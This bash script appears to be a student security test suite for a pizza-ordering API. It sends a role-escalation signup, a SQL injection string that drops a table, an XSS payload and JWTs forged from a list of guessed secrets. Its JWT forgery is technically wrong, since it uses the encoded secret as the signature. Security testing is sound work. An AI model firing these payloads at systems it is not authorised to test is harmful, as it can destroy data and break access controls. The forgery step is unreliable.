#!/bin/bash

# Check if host is provided as a command line argument
if [ -z "$1" ]; then
  echo "Usage: $0 <host>"
  echo "Example: $0 https://pizza-service.aonstott329.click"
  exit 1
fi
host=$1

# Test 1: Role Manipulation
echo "Testing role manipulation..."
# Try to create user with admin role directly
admin_response=$(curl -s -X POST "$host/api/auth" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"HackerAdmin\", \"email\":\"hacker@jwt.com\", \"password\":\"hacker123\", \"roles\": [{\"role\": \"admin\"}]}")

echo "Role manipulation response: $admin_response"

# Test 2: Token Verification
echo "Testing token verification..."
# Create a regular user first
user_response=$(curl -s -X POST "$host/api/auth" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"RegularUser\", \"email\":\"regular@jwt.com\", \"password\":\"regular123\"}")

echo "User creation response: $user_response"

# Get token and try to modify it
token=$(echo "$user_response" | jq -r '.token')
if [ -n "$token" ]; then
    # Try to use modified token
    echo "Testing modified token..."
    modified_token="${token}modified"
    response=$(curl -s -X GET "$host/api/order/menu" \
        -H "Authorization: Bearer $modified_token")
    echo "Modified token response: $response"
fi

# Test 3: Input Validation
echo "Testing input validation..."
# Try SQL injection in name
sql_injection_response=$(curl -s -X POST "$host/api/auth" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"'; DROP TABLE user; --\", \"email\":\"sql@jwt.com\", \"password\":\"sql123\"}")

echo "SQL injection response: $sql_injection_response"

# Test 4: Error Message Enumeration
echo "Testing error message enumeration..."
# Try non-existent user
nonexistent_response=$(curl -s -X PUT "$host/api/auth" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"nonexistent@jwt.com\", \"password\":\"password123\"}")

echo "Nonexistent user response: $nonexistent_response"

# Test 5: Role-Based Access Control
echo "Testing role-based access control..."
# Try to access admin endpoint as regular user
if [ -n "$token" ]; then
    admin_endpoint_response=$(curl -s -X PUT "$host/api/order/menu" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer $token" \
        -d "{\"title\":\"Test Pizza\", \"description\":\"Test\", \"image\":\"test.png\", \"price\": 9.99}")

    echo "Admin endpoint access response: $admin_endpoint_response"
fi

# Test 6: JWT Secret Weakness
echo "Testing JWT secret weakness..."
# Try common JWT secrets
common_secrets=("secret" "password" "admin" "jwtsecret" "pizza")
for secret in "${common_secrets[@]}"; do
    echo "Trying secret: $secret"
    # Create a fake token with the secret
    fake_token=$(echo -n "{\"roles\":[{\"role\":\"admin\"}]}" | base64).$(echo -n "{\"exp\":$(($(date +%s) + 3600))}" | base64).$(echo -n "$secret" | base64)
    response=$(curl -s -X GET "$host/api/order/menu" \
        -H "Authorization: Bearer $fake_token")
    echo "Secret test response: $response"
done

# Test 7: Metrics and Logging
echo "Testing metrics and logging..."
# Try to inject malicious data that might be logged
malicious_response=$(curl -s -X POST "$host/api/auth" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"<script>alert(1)</script>\", \"email\":\"xss@jwt.com\", \"password\":\"xss123\"}")

echo "Malicious input response: $malicious_response"

echo "Security testing complete" 